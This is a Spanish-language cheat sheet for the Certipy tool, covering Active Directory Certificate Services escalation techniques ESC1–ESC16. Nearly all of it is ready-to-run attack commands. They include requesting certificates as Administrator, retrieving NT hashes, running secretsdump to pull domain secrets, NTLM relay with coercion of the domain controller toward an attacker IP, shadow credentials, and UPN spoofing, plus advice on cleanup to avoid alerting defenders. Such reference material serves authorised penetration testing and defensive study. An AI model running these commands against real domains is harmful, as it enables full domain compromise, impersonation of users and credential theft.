## Certipy — Ataques sobre AD CS (ESC1-ESC16)

Certipy es una herramienta ofensiva y defensiva para enumerar y abusar de **Active Directory Certificate Services (AD CS)**. Permite descubrir plantillas mal configuradas y explotarlas para escalar privilegios, impersonar usuarios y obtener acceso persistente al dominio sin necesidad de exploits de kernel.

### Instalación

```shell
# Kali (mantenerla actualizada siempre)
sudo apt install certipy-ad

# Última versión desde el repo
pipx install -f "git+https://github.com/ly4k/Certipy.git"

# Via pip (entorno virtual)
python3 -m venv certipy-venv && source certipy-venv/bin/activate
pip install certipy-ad
```

---

## Enumeración

```shell
# Buscar plantillas vulnerables habilitadas — primer comando a lanzar siempre
certipy find -u <usuario>@<dominio> -p <contraseña> -dc-ip <ip_dc> \
  -target <dc> -enabled -vulnerable -stdout

# Si el DC no soporta LDAPS
certipy find -u <usuario>@<dominio> -p <contraseña> -dc-ip <ip_dc> \
  -target <dc> -enabled -vulnerable -stdout -scheme ldap

# Descubrir servicios de inscripción ADCS via LDAP
nxc ldap <objetivo> -u <usuario> -p <contraseña> -M adcs

# Enumerar CAs via RPC (sin credenciales)
nxc smb <objetivo> -M enum_ca
```

> 💡 Certipy genera automáticamente datos para BloodHound al ejecutar `find` — el ZIP resultante se puede importar para visualizar rutas de escalada via ADCS.

---

## Flujo general de explotación

Independientemente del ESC, el flujo siempre termina igual:

```shell
# Solicitar certificado → autenticar → obtener hash NT
certipy req -u <usuario>@<dominio> -p <contraseña> -ca <ca> \
  -target <dc> -template <plantilla> -upn administrator@<dominio> -dc-ip <ip_dc>

certipy auth -pfx administrator.pfx -domain <dominio> -u administrator -dc-ip <ip_dc>

# Usar el hash NT para acceso completo
secretsdump.py '<dominio>/administrator'@<ip_dc> -hashes ':<hash_nt>'
```

---

## ESC1 — El solicitante especifica el SAN (Subject Alternative Name)

**Condiciones:** Plantilla con `ENROLLEE_SUPPLIES_SUBJECT` activo + EKU de autenticación de cliente + sin aprobación de manager + usuarios del dominio pueden inscribirse.

```shell
# Solicitar certificado impersonando a Administrator
certipy req -u <usuario>@<dominio> -p <contraseña> -ca <ca> \
  -target <dominio> -template <plantilla> \
  -upn administrator@<dominio> -sid <sid_administrator> -dc-ip <ip_dc>

# Si la plantilla requiere clave RSA de 4096 bits
certipy req ... -key-size 4096

# Autenticar y obtener hash NT
certipy auth -pfx administrator.pfx -domain <dominio> -u administrator -dc-ip <ip_dc>
```

> 💡 Obtener el SID del objetivo: `certipy account -u <usuario> -p <pass> -dc-ip <ip> -user administrator read`

---

## ESC2 — Plantilla con EKU "Any Purpose" o sin EKU

**Condiciones:** La plantilla tiene el EKU `Any Purpose` (OID `2.5.29.37.0`) o ningún EKU definido, y usuarios de bajo privilegio pueden inscribirse. Esto otorga implícitamente capacidad de Agente de Inscripción.

La explotación es idéntica a ESC3 — el certificado obtenido se usa como agente para pedir uno en nombre de otro usuario:

```shell
# Paso 1 — Obtener certificado "Any Purpose"
certipy req -u <usuario>@<dominio> -p <contraseña> -ca <ca> \
  -target <dominio> -template <plantilla_esc2>

# Paso 2 — Usarlo como agente para obtener certificado de Administrator
certipy req -u <usuario>@<dominio> -p <contraseña> -ca <ca> \
  -target <dominio> -template User \
  -on-behalf-of '<dominio>\administrator' -pfx <cert_agente>.pfx

# Autenticar
certipy auth -pfx administrator.pfx -dc-ip <ip_dc>
```

---

## ESC3 — Agente de inscripción (On Behalf Of)

**Condiciones:** Existe una plantilla con EKU `Certificate Request Agent` y otra que permite solicitar certificados en nombre de otros usuarios sin restricciones de agente.

```shell
# Paso 1 — Obtener certificado de agente de inscripción
certipy req -u <usuario>@<dominio> -p <contraseña> -ca <ca> \
  -target <dominio> -template <plantilla_agente>

# Paso 2 — Solicitar certificado en nombre de Administrator
certipy req -u <usuario>@<dominio> -p <contraseña> -ca <ca> \
  -target <dominio> -template User \
  -on-behalf-of '<dominio>\administrator' -pfx <cert_agente>.pfx

# Autenticar
certipy auth -pfx administrator.pfx -dc-ip <ip_dc>
```

---

## ESC4 — Control de escritura sobre la plantilla

**Condiciones:** El usuario tiene `WriteProperty`, `WriteDacl` o `WriteOwner` sobre una plantilla existente — puede modificarla para convertirla en vulnerable a ESC1.

```shell
# 1. Modificar la plantilla para vulnerabilizarla a ESC1
# -write-default-configuration fuerza los cambios maliciosos en AD
# y genera automáticamente un backup JSON de la configuración original
certipy template -u <usuario>@<dominio> -p '<contraseña>' \
  -template <plantilla> -write-default-configuration -dc-ip <ip_dc>

# 2. Solicitar certificado como Administrator
# El parámetro -ca requiere el nombre exacto de la CA (ej. sequel-DC01-CA)
certipy req -u <usuario>@<dominio> -p '<contraseña>' -dc-ip <ip_dc> \
  -ca '<nombre_ca>' -template <plantilla> -upn administrator@<dominio>

# 3. Autenticar y obtener el hash NT
certipy auth -pfx administrator.pfx -domain <dominio> -dc-ip <ip_dc>

# 4. Restaurar la configuración original (limpieza obligatoria)
# El archivo JSON con el backup se generó automáticamente en el paso 1
certipy template -u <usuario>@<dominio> -p '<contraseña>' \
  -template <plantilla> -write-configuration <plantilla>.json -dc-ip <ip_dc>
```

> 💡 El paso 4 es importante en entornos reales — dejar la plantilla modificada puede alertar a los defensores y romper servicios legítimos que dependan de ella.
---

## ESC5 — Control de escritura sobre objetos PKI

**Condiciones:** El usuario tiene permisos de escritura sobre objetos del contenedor PKI en AD (`CN=Public Key Services,CN=Services,CN=Configuration`), incluyendo la propia CA, plantillas, o NTAuthCertificates.

> ESC5 es el vector más amplio — control sobre los objetos PKI de AD equivale a control total sobre la infraestrutura de certificados. La explotación depende del objeto concreto que sea escribible. Si se tiene control sobre la CA misma, se puede explotar via ESC7.

---

## ESC6 — Flag EDITF_ATTRIBUTESUBJECTALTNAME2 en la CA

**Condiciones:** La CA tiene el flag `EDITF_ATTRIBUTESUBJECTALTNAME2` activado, lo que permite especificar un SAN arbitrario en cualquier solicitud de certificado, independientemente de la configuración de la plantilla.

> ⚠️ Este flag fue parcheado por Microsoft en mayo 2022 (KB5014754). En DCs completamente actualizados ya no es explotable directamente, aunque puede seguir apareciendo en entornos sin parchear.

```shell
# Verificar si el flag está activo
certipy find -u <usuario>@<dominio> -p <contraseña> -dc-ip <ip_dc> -stdout

# Explotar — solicitar cualquier plantilla con -upn arbitrario
certipy req -u <usuario>@<dominio> -p <contraseña> -ca <ca> \
  -target <dominio> -template User -upn administrator@<dominio> -dc-ip <ip_dc>

certipy auth -pfx administrator.pfx -dc-ip <ip_dc>
```

---

## ESC7 — Control sobre la CA (Manage CA / Manage Certificates)

**Condiciones:** El usuario tiene derechos de `Manage CA` o `Manage Certificates` sobre la CA — puede aprobar solicitudes denegadas y habilitar plantillas.

```shell
# Añadirse como officer de la CA
certipy ca -ca <ca> -add-officer <usuario> \
  -u <usuario>@<dominio> -p <contraseña> -dc-ip <ip_dc>

# Habilitar la plantilla SubCA
certipy ca -ca <ca> -enable-template SubCA \
  -u <usuario>@<dominio> -p <contraseña> -dc-ip <ip_dc>

# Solicitar certificado con SubCA (será denegado — genera una petición pendiente)
certipy req -u <usuario>@<dominio> -p <contraseña> -ca <ca> \
  -target <ip_dc> -template SubCA -upn administrator@<dominio>

# Aprobar la petición manualmente con su ID
certipy ca -ca <ca> -issue-request <id_peticion> \
  -u <usuario>@<dominio> -p <contraseña>

# Recuperar el certificado aprobado
certipy req -u <usuario>@<dominio> -p <contraseña> -ca <ca> \
  -target <ip_dc> -retrieve <id_peticion>

# Autenticar
certipy auth -pfx administrator.pfx -domain <dominio> -u administrator -dc-ip <ip_dc>
```

---

## ESC8 — NTLM Relay al endpoint de inscripción web HTTP

**Condiciones:** El endpoint web de la CA (`/certsrv/`) acepta NTLM y no tiene EPA ni signing configurado. Se puede coaccionar al DC para que se autentique contra nosotros.

```shell
# Levantar el relay hacia el endpoint de inscripción
ntlmrelayx.py -t http://<dominio>/certsrv/certfnsh.asp -smb2support \
  --adcs --template <plantilla> \
  --no-http-server --no-wcf-server --no-raw-server

# Coaccionar autenticación del DC (desde otra terminal)
coercer coerce -u <usuario> -p <contraseña> \
  -l <ip_atacante> -t <ip_dc> --always-continue

# Autenticar con el certificado capturado
certipy auth -pfx administrator.pfx
```

> 💡 Si el endpoint escucha solo por HTTPS, NTLMRelayx puede tener problemas — en ese caso usar PetitPotam o PrinterBug para la coerción y ajustar el relay a HTTPS.

---

## ESC9 — Sin seguridad en el mapeo de certificados + GenericWrite

**Condiciones:** El usuario tiene `GenericWrite` sobre otro usuario, y la plantilla objetivo no requiere la extensión de seguridad `szOID_NTDS_CA_SECURITY_EXT` (sin `CT_FLAG_NO_SECURITY_EXTENSION`).

```shell
# Obtener hash del objetivo via Shadow Credentials
certipy shadow auto -u <usuario>@<dominio> -hashes :<hash_nt> -account <usuario_objetivo>

# Cambiar el UPN del objetivo para que apunte a Administrator
certipy account update -u <usuario>@<dominio> -hashes :<hash_nt> \
  -user <usuario_objetivo> -upn administrator

# Solicitar certificado como Administrator usando las credenciales del objetivo
certipy req -u <usuario_objetivo>@<dominio> -hashes :<hash_objetivo> \
  -ca <ca> -template <plantilla> -target <ip_dc>

# Restaurar el UPN original del objetivo
certipy account update -u <usuario>@<dominio> -hashes :<hash_nt> \
  -user <usuario_objetivo> -upn <usuario_objetivo>@<dominio>

# Autenticar con el certificado obtenido
certipy auth -pfx administrator.pfx -domain <dominio>
```

---

## ESC10 — Mapeo débil de certificados en el DC

**Condiciones:** El registro `StrongCertificateBindingEnforcement` está a `0` (sin enforcement) o `CertificateMappingMethods` incluye UPN mapping inseguro.

```shell
# Verificar configuración en el DC (desde Windows)
Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\Kdc' `
  -Name StrongCertificateBindingEnforcement

Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel' `
  -Name CertificateMappingMethods
```

**Caso 2 — GenericWrite sobre un usuario + DC vulnerable:**

```shell
# Cambiar el UPN del usuario víctima al UPN del DC
certipy account update -u <usuario>@<dominio> -p <contraseña> \
  -dc-ip <ip_dc> -target <dc> -upn <dc>$@<dominio> -user <usuario_victima>

# Obtener TGT de la víctima y exportarlo
getTGT.py <dominio>/<usuario_victima>:<contraseña> -dc-ip <ip_dc>
export KRB5CCNAME=<usuario_victima>.ccache

# Solicitar certificado usando las credenciales de la víctima
certipy req -k -dc-ip <ip_dc> -target <dc> -ca <ca> -template User

# Restaurar el UPN original
certipy account update -k -dc-ip <ip_dc> -target <dc> \
  -upn <usuario_victima>@<dominio> -user <usuario_victima>

# Autenticar con shell LDAP para RBCD
certipy auth -pfx <dc>.pfx -dc-ip <ip_dc> -ldap-shell
# Dentro de la shell: set_rbcd DC$ <maquina_controlada>$
```

---

## ESC11 — NTLM Relay al endpoint RPC de la CA

**Condiciones:** La interfaz RPC de la CA no requiere signing (ICertPassage), permitiendo relay NTLM similar a ESC8 pero sobre RPC en lugar de HTTP.

```shell
# Relay hacia el endpoint RPC de la CA
ntlmrelayx.py -t rpc://<ip_ca> -rpc-mode ICPR \
  --adcs-ca <nombre_ca> --adcs-template <plantilla> -smb2support

# Coaccionar autenticación
coercer coerce -u <usuario> -p <contraseña> \
  -l <ip_atacante> -t <ip_dc> --always-continue

certipy auth -pfx administrator.pfx -dc-ip <ip_dc>
```

---

## ESC13 — Política de issuance con grupo OID

**Condiciones:** La plantilla tiene una `Issuance Policy` vinculada a un grupo mediante un OID — al obtener un certificado de esa plantilla se adquiere la membresía lógica en ese grupo.

```shell
# Solicitar certificado de la plantilla con la política vinculada al grupo
certipy req -u <usuario>@<dominio> -p <contraseña> -ca <ca> \
  -target <dominio> -template <plantilla> -dc-ip <ip_dc>

# Autenticar — el TGT incluirá la membresía en el grupo vinculado
certipy auth -pfx <archivo>.pfx -dc-ip <ip_dc>
```

---

## ESC14 — Mapeo explícito via altSecurityIdentities

**Condiciones:** El usuario tiene permisos de escritura sobre el atributo `altSecurityIdentities` de un usuario objetivo — puede vincular un certificado propio a la cuenta del objetivo para autenticarse como él.

```shell
# Vincular el certificado controlado al usuario objetivo via altSecurityIdentities
bloodyAD --host <dc> -d <dominio> -u <usuario> -p <contraseña> \
  set object <usuario_objetivo> altSecurityIdentities \
  -v 'X509:<RFC822><usuario_objetivo>@<dominio>'

# Ajustar el atributo mail del objetivo
bloodyAD --host <dc> -d <dominio> -u <usuario> -p <contraseña> \
  set object <usuario_objetivo> mail -v <usuario_objetivo>@<dominio>

# Actualizar UPN del usuario controlado para que coincida con el objetivo
certipy account update -u <usuario_controlado>@<dominio> -p <contraseña> \
  -user <usuario_controlado> -upn <usuario_objetivo>

# Solicitar certificado
certipy req -u <usuario_controlado>@<dominio> -p <contraseña> \
  -ca <ca> -template <plantilla> -dc-ip <ip_dc>

# Restaurar UPN
certipy account update -u <usuario_controlado>@<dominio> -p <contraseña> \
  -user <usuario_controlado> -upn <usuario_controlado>@<dominio> -dc-ip <ip_dc>

# Autenticar como el objetivo
certipy auth -pfx <cert>.pfx -dc-ip <ip_dc> -user <usuario_objetivo> -domain <dominio>
```

---

## ESC15 — EKUwu (Application Policies en plantillas v1)

**Condiciones:** La plantilla es Schema Version 1 y permite especificar `Application Policies` arbitrarias en la solicitud, sobreescribiendo el EKU de la plantilla. Parcheado como CVE-2024-49019.

**Escenario A — Client Authentication directo:**

```shell
certipy req -u <usuario>@<dominio> -p <contraseña> -dc-ip <ip_dc> \
  -target <dc> -ca <ca> -template <plantilla_v1> \
  -upn administrator@<dominio> -sid <sid_administrator> \
  -application-policies 'Client Authentication'

certipy auth -pfx administrator.pfx -dc-ip <ip_dc> -ldap-shell
```

**Escenario B — Certificate Request Agent:**

```shell
# Solicitar certificado de agente con Application Policy personalizada
certipy req -u <usuario>@<dominio> -p <contraseña> -dc-ip <ip_dc> \
  -ca <ca> -template WebServer \
  -application-policies 'Certificate Request Agent'

# Usar el agente para solicitar en nombre de Administrator
certipy req -u <usuario>@<dominio> -p <contraseña> -dc-ip <ip_dc> \
  -ca <ca> -template User -pfx <agente>.pfx \
  -on-behalf-of '<dominio>\Administrator'

certipy auth -pfx administrator.pfx -dc-ip <ip_dc>
```

---

## ESC16 — Mapeo por UPN sin extensión de seguridad (Global)

**Condiciones:** La CA no emite la extensión de seguridad `szOID_NTDS_CA_SECURITY_EXT` globalmente (flag `EDITF_ATTRIBUTESUBJECTALTNAME2` o configuración similar), permitiendo falsificar UPNs sin SID. Requiere `GenericWrite` o `GenericAll` sobre un usuario.

```shell
# Cambiar el UPN del usuario controlado al de Administrator
certipy account -u <usuario_controlado>@<dominio> -p <contraseña> \
  -dc-ip <ip_dc> -upn administrator -user <usuario_controlado> update

# Solicitar certificado — el UPN falso quedará embebido
certipy req -u <usuario_controlado>@<dominio> -p <contraseña> \
  -dc-ip <ip_dc> -target <dc> -ca <ca> -template User \
  -upn administrator@<dominio> -sid <sid_administrator>

# Restaurar UPN original
certipy account -u <usuario_controlado>@<dominio> -p <contraseña> \
  -dc-ip <ip_dc> -upn <usuario_controlado>@<dominio> \
  -user <usuario_controlado> update

# Autenticar
certipy auth -pfx administrator.pfx -dc-ip <ip_dc> -domain <dominio>
```

---

## Shadow Credentials con Certipy

Certipy puede realizar el ataque de Shadow Credentials directamente, sin necesidad de pywhisker:

```shell
# Automático — obtiene el hash NT en un solo comando
certipy shadow auto -u <usuario_controlado>@<dominio> -p <contraseña> \
  -account <usuario_objetivo>

# Con hash NT (Pass-the-Hash)
certipy shadow auto -u <usuario_controlado>@<dominio> \
  -hashes :<hash_nt> -account <usuario_objetivo>
```

---

## Resumen de ESCs

| ESC | Vector principal | Requisito clave |
| --- | ---------------- | --------------- |
| ESC1 | SAN controlado por el solicitante | `ENROLLEE_SUPPLIES_SUBJECT` + auth EKU |
| ESC2 | EKU "Any Purpose" como agente | Plantilla sin EKU o con `Any Purpose` |
| ESC3 | On-behalf-of via agente de inscripción | Plantilla de agente + plantilla objetivo |
| ESC4 | Modificar la plantilla | WriteDacl/WriteProperty sobre plantilla |
| ESC5 | Control sobre objetos PKI en AD | Escritura sobre contenedor PKI |
| ESC6 | SAN arbitrario a nivel de CA | Flag `EDITF_ATTRIBUTESUBJECTALTNAME2` |
| ESC7 | Aprobar solicitudes como officer | `Manage CA` o `Manage Certificates` |
| ESC8 | NTLM Relay a HTTP enrollment | Endpoint `/certsrv/` sin EPA |
| ESC9 | UPN spoofing + GenericWrite | Sin extensión de seguridad en plantilla |
| ESC10 | Mapeo débil en DC | `StrongCertificateBindingEnforcement = 0` |
| ESC11 | NTLM Relay a RPC enrollment | Interfaz ICertPassage sin signing |
| ESC13 | Grupo via OID de política | Issuance Policy vinculada a grupo |
| ESC14 | altSecurityIdentities | Escritura sobre atributo del objetivo |
| ESC15 | Application Policies en plantillas v1 | Schema Version 1 sin parchear |
| ESC16 | UPN falso sin SID (global) | CA sin extensión de seguridad global |

---

### Referencias

- https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
- https://www.thehacker.recipes/ad/movement/adcs/
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
- https://seriotonctf.github.io/ADCS-Attacks-with-Certipy/
- https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/
